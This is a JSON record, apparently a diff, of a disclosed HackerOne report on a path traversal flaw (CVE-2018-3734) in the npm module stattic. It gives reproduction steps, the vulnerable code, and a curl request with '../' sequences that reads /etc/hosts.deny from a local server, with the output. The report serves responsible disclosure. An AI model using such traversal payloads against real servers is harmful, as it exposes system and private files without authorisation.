@@ -1,0 +1,134 @@
+{
+  "id": 319003,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTkwMDM=",
+  "url": "https://hackerone.com/reports/319003",
+  "title": "[stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-23T12:44:58.526Z",
+  "submitted_at": "2018-02-23T12:44:58.526Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3734"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-06T22:04:34.271Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-03-05T19:35:26.918Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report Path Traversal in ```stattic``` module.\nIt allows to read content of some arbitrary files from the server where ```stattic``` is installed and run.\n\n## Module\n\n**module name:** stattic\n**version:** 0.2.3\n**npm page:** https://www.npmjs.com/package/stattic\n\n### Module Description\n\nRidiculous simple script for serving static files using http module.\n\n### Module Stats\n\nStats\n7 downloads in the last day\n32 downloads in the last week\n77 downloads in the last month\n\n~900 estimated downloads per year\n\n## Vulnerability Description\n\nPath Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.\n\nHowever, this issue allows to read only files with extension, because if no extension is provided, ```stattic``` by default uses setting from ```options.index``` variable.\n\n## Steps To Reproduce:\n\nInstall ```stattic``` module:\n\n```\n$ npm install stattic\n```\n\nCreate sample application:\n\n```javascript\n// app.js\n//Import libs\nvar stattic = require('stattic');\n \n//Set the folder with the static files\nstattic.set('folder', './');\n \n//Set the port\nstattic.set('port', 8080);\n \n//Run the server\nstattic.listen();\n```\n\nRun application:\n\n```\n$ node app.js\n```\n\nHere's the part of ```stattic``` code responsible for handling paths:\n\n```javascript\n// node_modules/stattic/index.js, line 70:\n\n    //Parse the request url and get only the pathname\n    var pathname = url.parse(req.url).pathname;\n\n    //Resolve to the local folder\n    var local_path = path.join(options.folder, pathname);\n\n    //Check the extension\n    if(path.extname(local_path) === '')\n    {\n      //Add the index file to the local path\n      local_path = path.join(local_path, './' + path.basename(options.index));\n    }\n\n```\n\nIf file provided has no extension, ```/``` and ```options.index``` are added (by default, it will become ```/index.html```). This causes that eg. ```/etc/passwd``` path become ```/etc/passwd/index.html```, but ```/etc/hosts.deny``` is valid filename and can be read:\n\n```\n$ curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny\n*   Trying ::1...\n* Connected to localhost (::1) port 8080 (#0)\n> GET /../../../../../etc/hosts.deny HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Content-Type: null\n< Date: Fri, 23 Feb 2018 12:36:35 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \n# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system.\n#                  See the manual pages hosts_access(5) and hosts_options(5).\n#\n# Example:    ALL: some.host.name, .some.domain\n#             ALL EXCEPT in.fingerd: other.host.name, .other.domain\n#\n# If you're going to protect the portmapper use the name \"rpcbind\" for the\n# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.\n#\n# The PARANOID wildcard matches any host whose name does not match its\n# address.\n#\n# You may wish to enable this to ensure any programs that don't\n# validate looked up hostnames still leave understandable logs. In past\n# versions of Debian this has been the default.\n# ALL: PARANOID\n\n* Connection #0 to host localhost left intact\n```\n\n## Patch\n\nProbably some protection against typical Path Traversal exploitation methods should be introduced here.\n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- curl 7.47.0\n\n## Wrap up\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nPath Traversal vulnerability in ```stattic module``` allows to go up in directory tree and read content of some files outside of the root path set up in the module config.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-04-04T19:35:27.118Z",
+  "allow_singular_disclosure_after": -255469758.44957292,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "whitesector",
+    "eveeez",
+    "khalooda0x",
+    "cr4xerbik4sh",
+    "japz",
+    "geotester",
+    "alexoooo"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 6377,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "stattic",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
